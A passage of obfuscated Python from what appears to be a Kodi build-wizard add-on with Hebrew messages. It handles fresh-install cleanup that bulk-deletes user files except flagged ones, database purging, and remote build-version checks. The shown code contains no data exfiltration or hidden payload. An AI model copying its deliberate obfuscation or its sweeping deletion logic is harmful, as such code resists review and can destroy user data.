				elif O00O000000OOOO0OO =='b-sdrvt-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5589
				elif O00O000000OOOO0OO =='x1112.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5590
				elif O00O000000OOOO0OO =='b-tlvvyzyh-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5591
				elif O00O000000OOOO0OO =='x1111.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5592
				elif O00O000000OOOO0OO =='b-tvknyshrly-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5593
				elif O00O000000OOOO0OO =='x1110.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5594
				elif O00O000000OOOO0OO =='b-yldym-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5595
				elif O00O000000OOOO0OO =='x1114.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5596
				elif O00O000000OOOO0OO =='b-mvzyqh-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5597
				elif O00O000000OOOO0OO =='mainmenu.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5598
				elif O00O000000OOOO0OO =='skin.Premium.mod.properties'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5599
				elif O00O000000OOOO0OO =='x1122.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5601
				elif O00O000000OOOO0OO =='b-spvrt-b.DATA.xml'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5602
				elif O00O000000OOOO0OO =='favourites.xml'and OOOO000O0O0OO0OO0 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5607
				elif O00O000000OOOO0OO =='guisettings.xml'and OOOO000O0O0OO0OO0 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5609
				elif O00O000000OOOO0OO =='profiles.xml'and OOOO000O0O0OO0OO0 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5610
				elif O00O000000OOOO0OO =='advancedsettings.xml'and OOOO000O0O0OO0OO0 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5611
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5612
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'program.apollo'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5613
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5614
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.telemedia'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5615
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.elementum'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5618
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5620
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'weather.yahoo'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5621
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.quasar'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5622
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'program.apollo'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5623
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5624
				elif OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -2 ]=='userdata'and OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOO000O0O0OO0OO0 [OOO0O0OO000OO000O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5625
				elif O00O000000OOOO0OO in LOGFILES :wiz .log ("Keep Log File: %s"%O00O000000OOOO0OO ,xbmc .LOGNOTICE )#line:5626
				elif O00O000000OOOO0OO .endswith ('.db'):#line:5627
					try :#line:5628
						if O00O000000OOOO0OO ==OOO00OO0O0O0OO000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00O000000OOOO0OO ,KODIV ),xbmc .LOGNOTICE )#line:5629
						else :os .remove (os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ))#line:5630
					except Exception as OOOOO00OOO0OO00OO :#line:5631
						if not O00O000000OOOO0OO .startswith ('Textures13'):#line:5632
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5633
							wiz .log ("-> %s"%(str (OOOOO00OOO0OO00OO )),xbmc .LOGNOTICE )#line:5634
							wiz .purgeDb (os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ))#line:5635
				else :#line:5636
					DP .update (int (wiz .percentage (OO000OO0O0000OO0O ,O0O00OO0OO000OO0O )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O000000OOOO0OO ),'')#line:5637
					try :os .remove (os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ))#line:5638
					except Exception as OOOOO00OOO0OO00OO :#line:5639
						wiz .log ("Error removing %s"%os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),xbmc .LOGNOTICE )#line:5640
						wiz .log ("-> / %s"%(str (OOOOO00OOO0OO00OO )),xbmc .LOGNOTICE )#line:5641
			if DP .iscanceled ():#line:5642
				DP .close ()#line:5643
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5644
				return False #line:5645
		for OOOOO000OOOOO0OO0 ,OOOOO0O0O00OOO0O0 ,OO00O0OO0O00OO00O in os .walk (O00OO0O0OO0O00OOO ,topdown =True ):#line:5646
			OOOOO0O0O00OOO0O0 [:]=[O0O00OO0O0OO0OOO0 for O0O00OO0O0OO0OOO0 in OOOOO0O0O00OOO0O0 if O0O00OO0O0OO0OOO0 not in EXCLUDES ]#line:5647
			for O00O000000OOOO0OO in OOOOO0O0O00OOO0O0 :#line:5648
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O000000OOOO0OO ),'')#line:5649
			  if O00O000000OOOO0OO not in ["Database","userdata","temp","addons","addon_data"]:#line:5650
			   if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5651
			    if not (O00O000000OOOO0OO =='skin.titan'and KEEPSKIN3 =='true'):#line:5653
			      if not (O00O000000OOOO0OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5654
			       if not (O00O000000OOOO0OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5655
			        if not (O00O000000OOOO0OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5656
			         if not (O00O000000OOOO0OO =='program.apollo'and KEEPINFO =='true'):#line:5657
			          if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5658
			           if not (O00O000000OOOO0OO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5659
			            if not (O00O000000OOOO0OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5660
			             if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5661
			              if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5662
			               if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5663
			                if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5664
			                 if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5665
			                  if not (O00O000000OOOO0OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5666
			                   if not (O00O000000OOOO0OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5667
			                    if not (O00O000000OOOO0OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5668
			                     if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5669
			                      if not (O00O000000OOOO0OO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5670
			                       if not (O00O000000OOOO0OO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5671
			                           if not (O00O000000OOOO0OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5675
			                            if not (O00O000000OOOO0OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5676
			                             if not (O00O000000OOOO0OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5677
			                              if not (O00O000000OOOO0OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5678
			                               if not (O00O000000OOOO0OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5679
			                                  shutil .rmtree (os .path .join (OOOOO000OOOOO0OO0 ,O00O000000OOOO0OO ),ignore_errors =True ,onerror =None )#line:5681
			if DP .iscanceled ():#line:5682
				DP .close ()#line:5683
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5684
				return False #line:5685
		DP .close ()#line:5686
		wiz .clearS ('build')#line:5687
		if over ==True :#line:5688
			return True #line:5689
		elif install =='restore':#line:5690
			return True #line:5691
		elif install :#line:5692
			buildWizard (install ,'normal',over =True )#line:5693
		else :#line:5694
			if INSTALLMETHOD ==1 :OO0O0OOO0O0OOOOO0 =1 #line:5695
			elif INSTALLMETHOD ==2 :OO0O0OOO0O0OOOOO0 =0 #line:5696
			else :OO0O0OOO0O0OOOOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5697
			if OO0O0OOO0O0OOOOO0 ==1 :wiz .reloadFix ('fresh')#line:5698
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5699
	else :#line:5700
		if not install =='restore':#line:5701
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5702
			wiz .refresh ()#line:5703
def clearCache ():#line:5708
		wiz .clearCache ()#line:5709
def fixwizard ():#line:5713
		wiz .fixwizard ()#line:5714
def totalClean ():#line:5716
		wiz .clearCache ()#line:5718
		wiz .clearPackages ('total')#line:5719
		clearThumb ('total')#line:5720
		cleanfornewbuild ()#line:5721
def cleanfornewbuild ():#line:5722
		try :#line:5723
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5724
		except :#line:5725
			pass #line:5726
		try :#line:5727
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5728
		except :#line:5729
			pass #line:5730
		try :#line:5731
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5732
		except :#line:5733
			pass #line:5734
def clearThumb (type =None ):#line:5735
	OO00O0O00OOOOO00O =wiz .latestDB ('Textures')#line:5736
	if not type ==None :O0O0OOO0O0OOOO000 =1 #line:5737
	else :O0O0OOO0O0OOOO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O0O00OOOOO00O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5738
	if O0O0OOO0O0OOOO000 ==1 :#line:5739
		try :wiz .removeFile (os .join (DATABASE ,OO00O0O00OOOOO00O ))#line:5740
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O0O00OOOOO00O )#line:5741
		wiz .removeFolder (THUMBS )#line:5742
	else :wiz .log ('Clear thumbnames cancelled')#line:5744
	wiz .redoThumbs ()#line:5745
def purgeDb ():#line:5747
	OO0OOO000O0OO0O00 =[];O0000O000OO0000OO =[]#line:5748
	for OO00OOO0O00O00O0O ,OO0O00OOO0O0O00O0 ,OO0O000O000000O0O in os .walk (HOME ):#line:5749
		for O0O0OO0O000O0O00O in fnmatch .filter (OO0O000O000000O0O ,'*.db'):#line:5750
			if O0O0OO0O000O0O00O !='Thumbs.db':#line:5751
				O00O0OO0OO0OOO0O0 =os .path .join (OO00OOO0O00O00O0O ,O0O0OO0O000O0O00O )#line:5752
				OO0OOO000O0OO0O00 .append (O00O0OO0OO0OOO0O0 )#line:5753
				O0OOO00OOO00OOOOO =O00O0OO0OO0OOO0O0 .replace ('\\','/').split ('/')#line:5754
				O0000O000OO0000OO .append ('(%s) %s'%(O0OOO00OOO00OOOOO [len (O0OOO00OOO00OOOOO )-2 ],O0OOO00OOO00OOOOO [len (O0OOO00OOO00OOOOO )-1 ]))#line:5755
	if KODIV >=16 :#line:5756
		O00O0O000O0OO0OOO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0000O000OO0000OO )#line:5757
		if O00O0O000O0OO0OOO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5758
		elif len (O00O0O000O0OO0OOO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5759
		else :#line:5760
			for O0O000O00O0O000OO in O00O0O000O0OO0OOO :wiz .purgeDb (OO0OOO000O0OO0O00 [O0O000O00O0O000OO ])#line:5761
	else :#line:5762
		O00O0O000O0OO0OOO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0000O000OO0000OO )#line:5763
		if O00O0O000O0OO0OOO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5764
		else :wiz .purgeDb (OO0OOO000O0OO0O00 [O0O000O00O0O000OO ])#line:5765
def fastupdatefirstbuild (OO0OOO00O00O000OO ):#line:5771
	if ENABLE =='Yes':#line:5774
		if not NOTIFY =='true':#line:5775
			OO0O00OOO000OOO0O =wiz .workingURL (NOTIFICATION )#line:5776
			if OO0O00OOO000OOO0O ==True :#line:5777
				OO000O0OOOO0O0000 ,O0000OOO0O0OO0O0O =wiz .splitNotify (NOTIFICATION )#line:5778
				if not OO000O0OOOO0O0000 ==False :#line:5780
					try :#line:5781
						OO000O0OOOO0O0000 =int (OO000O0OOOO0O0000 );OO0OOO00O00O000OO =int (OO0OOO00O00O000OO )#line:5782
						checkidupdate ()#line:5783
						wiz .setS ("notedismiss","true")#line:5784
						if OO000O0OOOO0O0000 ==OO0OOO00O00O000OO :#line:5785
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO000O0OOOO0O0000 ),xbmc .LOGNOTICE )#line:5786
						elif OO000O0OOOO0O0000 >OO0OOO00O00O000OO :#line:5788
							wiz .log ("[Notifications] id: %s"%str (OO000O0OOOO0O0000 ),xbmc .LOGNOTICE )#line:5789
							wiz .setS ('noteid',str (OO000O0OOOO0O0000 ))#line:5790
							wiz .setS ("notedismiss","true")#line:5791
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5794
					except Exception as OO0O0OOOOO0O0OOO0 :#line:5795
						wiz .log ("Error on Notifications Window: %s"%str (OO0O0OOOOO0O0OOO0 ),xbmc .LOGERROR )#line:5796
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5798
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O00OOO000OOO0O ),xbmc .LOGNOTICE )#line:5799
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5800
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5801
def checkUpdate ():#line:5803
	OO00O0O0OO00O0OOO =wiz .getS ('disableupdate')#line:5804
	OOO0O0O00000O0OOO =wiz .getS ('buildname')#line:5805
	O00000OOO000O0000 =wiz .getS ('buildversion')#line:5806
	O00O0000OOOOO0O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5807
	OO0OOOOO0OO000OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%OOO0O0O00000O0OOO ).findall (O00O0000OOOOO0O00 )#line:5808
	if len (OO0OOOOO0OO000OO0 )>0 :#line:5809
		OOOOOO0O0O0OOOOO0 =OO0OOOOO0OO000OO0 [0 ][0 ]#line:5810
		O00OO000OOO0O000O =OO0OOOOO0OO000OO0 [0 ][1 ]#line:5811
		O0OOO0O000OOOOOO0 =OO0OOOOO0OO000OO0 [0 ][2 ]#line:5812
		wiz .setS ('latestversion',OOOOOO0O0O0OOOOO0 )#line:5813
		if OOOOOO0O0O0OOOOO0 >O00000OOO000O0000 :#line:5814
			if OO00O0O0OO00O0OOO =='false':#line:5815
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O00000OOO000O0000 ,OOOOOO0O0O0OOOOO0 ),xbmc .LOGNOTICE )#line:5816
				notify .updateWindow (OOO0O0O00000O0OOO ,O00000OOO000O0000 ,OOOOOO0O0O0OOOOO0 ,O00OO000OOO0O000O ,O0OOO0O000OOOOOO0 )#line:5817
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O00000OOO000O0000 ,OOOOOO0O0O0OOOOO0 ),xbmc .LOGNOTICE )#line:5818
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O00000OOO000O0000 ,OOOOOO0O0O0OOOOO0 ),xbmc .LOGNOTICE )#line:5819
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5820
def updatetelemedia (OO0OO00O000O00000 ):#line:5821
    from startup import teleupdate #line:5822
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5823
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5824
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5825
    wiz .wizardUpdate ('startup')#line:5826
    checkUpdate ()#line:5828
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5829
    time .sleep (15.0 )#line:5830
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5831
     if teleupdate is False :#line:5832
        wiz .STARTP ()#line:5834
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5835
        if not NOTIFY =='true':#line:5836
            OO000O00O0O0OO0O0 =wiz .workingURL (NOTIFICATION )#line:5837
            if OO000O00O0O0OO0O0 ==True :#line:5838
                OOO0O0OO00O0OO0OO ,OO00O00000O0000OO =wiz .splitNotify (NOTIFICATION )#line:5839
                if not OOO0O0OO00O0OO0OO ==False :#line:5840
                    try :#line:5841
                        OOO0O0OO00O0OO0OO =int (OOO0O0OO00O0OO0OO );OO0OO00O000O00000 =int (OO0OO00O000O00000 )#line:5842
                        if OOO0O0OO00O0OO0OO ==OO0OO00O000O00000 :#line:5843
                            if NOTEDISMISS =='false':#line:5844
                                debridit .debridIt ('update','all')#line:5845
                                traktit .traktIt ('update','all')#line:5846
                                checkidupdatetele ()#line:5847
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO0O0OO00O0OO0OO ),xbmc .LOGNOTICE )#line:5848
                        elif OOO0O0OO00O0OO0OO >OO0OO00O000O00000 :#line:5849
                            wiz .log ("[Notifications] id: %s"%str (OOO0O0OO00O0OO0OO ),xbmc .LOGNOTICE )#line:5850
                            wiz .setS ('noteid',str (OOO0O0OO00O0OO0OO ))#line:5851
                            wiz .setS ('notedismiss','false')#line:5852
                            debridit .debridIt ('update','all')#line:5854
                            traktit .traktIt ('update','all')#line:5855
                            checkidupdatetele ()#line:5856
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5858
                    except Exception as O00O0O0O00OO000OO :#line:5859
